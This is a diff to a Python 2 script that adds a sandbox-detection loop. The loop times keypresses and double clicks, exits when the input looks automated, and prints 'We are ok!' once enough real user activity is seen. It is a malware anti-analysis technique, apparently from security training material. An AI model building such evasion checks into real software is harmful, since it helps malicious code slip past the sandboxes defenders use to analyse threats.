@@ -75,3 +75,39 @@ class LASTINPUTINFO(ctypes.Structure):
         # if we hit our threshold let's bail out
         if last_input >= max_input_threshold:
             sys.exit(0)
+
+        while not detection_complete:
+            keypress_time = get_key_press()
+
+            if keypress_time is not None and previous_timestamp is not None:
+
+                # calculate the time between double clicks
+                elapsed = keypress_time - previous_timestamp
+
+                # the user double cliked
+                if elapsed <= double_click_threshold:
+                    double_clicks += 1
+
+                    if first_double_click is None:
+
+                        # grab the timestamp for the first double click
+                        first_double_click = time.time()
+
+                    else:
+
+                        if double_clicks == max_double_clicks:
+                            if keypress_time - first_double_click <= (max_double_clicks * double_click_threshold):
+                                sys.exit(0)
+
+                # we are happy there;s enough user input
+                if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks:
+
+                    return
+
+                previous_timestamp = keypress_time
+
+            elif  keypress_time is not None:
+                previous_timestamp = keypress_time
+
+    detect_sandbox()
+    print 'We are ok!'
